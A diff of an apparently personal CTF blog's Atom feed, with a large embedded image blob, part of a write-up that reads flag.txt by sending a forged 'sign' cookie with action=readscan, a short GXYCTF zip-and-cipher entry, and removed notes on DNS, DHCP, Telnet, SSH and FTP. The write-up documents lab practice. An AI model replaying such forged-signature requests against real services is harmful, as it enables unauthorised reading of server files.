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" alt="1 d18ebf74f746340f338d85c4ff131e3c " loading="lazy"></figure>
+<p>d18ebf74f746340f338d85c4ff131e3c</p>
+<p>于是我们利用scan方法来读取flag.txt的内容。</p>
+<figure data-type="image" tabindex="8"><img src="5.png" alt="" loading="lazy"></figure>
+<p>Connection: close</p>
+<p>Cookie: action=readscan; sign=325d8600b490f9f3bd8423fde7d43c72</p>
+<p>Upgrade-Insecure-Requests: 1</p>
+<p>Pragma: no-cache</p>
+<p>Cache-Control: no-cache</p>
 <blockquote>
-<p>https://blog.csdn.net/Z_Grant/article/details/90650111</p>
+<p>get传参:</p>
+<p>param=flag.txt</p>
+<p>cookie：</p>
+<p>action=action</p>
+<p>sign=911db68eab96df16a18bc3521fb10d3d</p>
 </blockquote>
-<ul>
-<li>
-<p>DNS服务</p>
-<p>IP地址电脑理解不了URL域名，在这种情况下，使用dns服务。</p>
-</li>
-<li>
-<p>DHCP服务</p>
-</li>
-</ul>
-<p><strong>动态主机设置协议</strong>（英语：<strong>Dynamic Host Configuration Protocol</strong>**，DHCP**）是一个<a href="https://baike.baidu.com/item/%E5%B1%80%E5%9F%9F%E7%BD%91">局域网</a>的<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE">网络协议</a>，使用<a href="https://baike.baidu.com/item/UDP">UDP</a>协议工作，主要有两个用途：用于内部网或网络服务供应商自动分配<a href="https://baike.baidu.com/item/IP">IP</a>地址；给用户用于内部网管理员作为对所有计算机作中央管理的手段。</p>
-<ul>
-<li>Telnet服务</li>
-</ul>
-<p>Telnet协议是<a href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE">TCP/IP协议</a>族中的一员，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151">主机</a>工作的能力。在<a href="https://baike.baidu.com/item/%E7%BB%88%E7%AB%AF/1903878">终端</a>使用者的电脑上使用telnet程序，用它连接到<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571">服务器</a>。<a href="https://baike.baidu.com/item/%E7%BB%88%E7%AB%AF/1903878">终端</a>使用者可以在telnet程序中输入命令，这些命令会在<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571">服务器</a>上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571">服务器</a>。要开始一个telnet会话，必须输入用户名和密码来登录<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571">服务器</a>。Telnet是常用的<a href="https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/934368">远程控制</a>Web<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8">服务器</a>的方法。</p>
-<ul>
-<li>SSH服务</li>
-</ul>
-<blockquote>
-<p>多用于Linux，与telnet类似，SSH 为 [Secure Shell](https://baike.baidu.com/item/Secure Shell) 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为<a href="https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95/1071998">远程登录</a>会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括<a href="https://baike.baidu.com/item/HP-UX">HP-UX</a>、<a href="https://baike.baidu.com/item/Linux">Linux</a>、<a href="https://baike.baidu.com/item/AIX">AIX</a>、<a href="https://baike.baidu.com/item/Solaris/3517">Solaris</a>、<a href="https://baike.baidu.com/item/Digital">Digital</a> <a href="https://baike.baidu.com/item/UNIX">UNIX</a>、<a href="https://baike.baidu.com/item/Irix">Irix</a>，以及其他平台，都可运行SSH。传统的网络服务程序，如：<a href="https://baike.baidu.com/item/ftp">ftp</a>、pop和<a href="https://baike.baidu.com/item/telnet">telnet</a>在本质上都是不安全的，因为它们在网络上用<a href="https://baike.baidu.com/item/%E6%98%8E%E6%96%87">明文</a>传送口令和数据，别有用心的人非常容易就可以截获这些口令和数据。而且，这些服务程序的<a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81">安全验证</a>方式也是有其弱点的， 就是很容易受到“中间人”（man-in-the-middle）这种方式的攻击。所谓“中间人”的攻击方式， 就是“中间人”冒充真正的<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8">服务器</a>接收你传给服务器的数据，然后再冒充你把数据传给真正的服务器。服务器和你之间的数据传送被“中间人”转手做了手脚之后，就会出现很严重的问题。通过使用SSH，你可以把所有传输的数据进行加密，这样&quot;中间人&quot;这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的<a href="https://baike.baidu.com/item/%E9%80%9F%E5%BA%A6/5456">速度</a>。SSH有很多功能，它既可以代替<a href="https://baike.baidu.com/item/Telnet">Telnet</a>，又可以为<a href="https://baike.baidu.com/item/FTP">FTP</a>、<a href="https://baike.baidu.com/item/PoP">PoP</a>、甚至为<a href="https://baike.baidu.com/item/PPP">PPP</a>提供一个安全的&quot;通道&quot;</p>
-<p>从客户端来看，SSH提供两种级别的安全验证。</p>
-<p>首先是基于口令的安全验证，只要你知道自己的帐号和口令，就可以登录到远程主机。所有传输的数据都会被加密，但是不能保证你正在连接的服务器就是你想连接的<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8">服务器</a>。可能会有别的服务器在冒充真正的服务器，也就是受到“中间人”这种方式的攻击。其次是基于密钥的安全验证，这需要依靠<a href="https://baike.baidu.com/item/%E5%AF%86%E5%8C%99">密匙</a>，也就是你必须为自己创建一对密匙，并把公用密匙放在需要访问的服务器上。如果你要连接到SSH服务器上，客户端软件就会向服务器发出请求，请求用你的密匙进行安全验证。服务器收到请求之后，先在该服务器上你的主目录下寻找你的公用密匙，然后把它和你发送过来的公用密匙进行比较。如果两个密匙一致，服务器就用公用密匙加密“质询”（challenge）并把它发送给客户端软件。客户端软件收到“质询”之后就可以用你的私人密匙解密再把它发送给服务器。用这种方式，你必须知道自己密匙的<a href="https://baike.baidu.com/item/%E5%8F%A3%E4%BB%A4">口令</a>。但是，与第一种级别相比，第二种级别不需要在网络上传送口令。</p>
-<p>第二种级别不仅加密所有传送的数据，而且“中间人”这种攻击方式也是不可能的（因为他没有你的私人密匙）。但是整个登录的过程可能需要10秒。</p>
-</blockquote>
-<ul>
-<li>FTP服务</li>
-</ul>
-<blockquote>
-<p>即文件传输协议（<a href="https://baike.baidu.com/item/%E8%8B%B1%E6%96%87">英文</a>：<strong>F</strong>ile <strong>T</strong>ransfer <strong>P</strong>rotocol，<a href="https://baike.baidu.com/item/%E7%BC%A9%E5%86%99">缩写</a>：<strong>FTP</strong>）是用于在<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C">网络</a>上进行文件传输的一套标准协议，使用客户/服务器模式。它属于<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">网络传输协议</a>的<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E5%B1%82">应用层</a>。文件传送（file transfer）和文件访问（file access）之间的区别在于：前者由FTP提供，后者由如NFS等应用系统提供</p>
-<p><a href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE">TCP/IP协议</a>中，FTP标准命令TCP<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3">端口</a>号为21，Port方式数据端口为20。FTP的任务是从一台计算机将文件传送到另一台计算机，不受<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>的限制。</p>
-<p>需要进行远程文件传输的计算机必须安装和运行ftp客户程序。在windows操作系统的安装过程中，通常都安装了tcp/ip协议软件，其中就包含了ftp客户程序。但是该程序是字符界面而不是图形界面，这就必须以<a href="https://baike.baidu.com/item/%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6">命令提示符</a>的方式进行操作，很不方便。</p>
-</blockquote>
+<figure data-type="image" tabindex="9"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTk0NzE5MC8yMDIwMDQvMTk0NzE5MC0yMDIwMDQwMTE5NDMxNjAxNC0yMDMyOTgxMjM4LnBuZw?x-oss-process=image/format,png" alt="img" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[GXYCTF2019]佛系青年]]></title>
+        <id>https://Ro1ing.github.io/post/gxyctf2019fo-xi-qing-nian/</id>
+        <link href="https://Ro1ing.github.io/post/gxyctf2019fo-xi-qing-nian/">
+        </link>
+        <updated>2021-01-30T06:36:01.000Z</updated>
+        <content type="html"><![CDATA[<p>压缩包文件头损坏 伪加密</p>
+<p>与佛论禅解密</p>
 ]]></content>
     </entry>
 </feed>
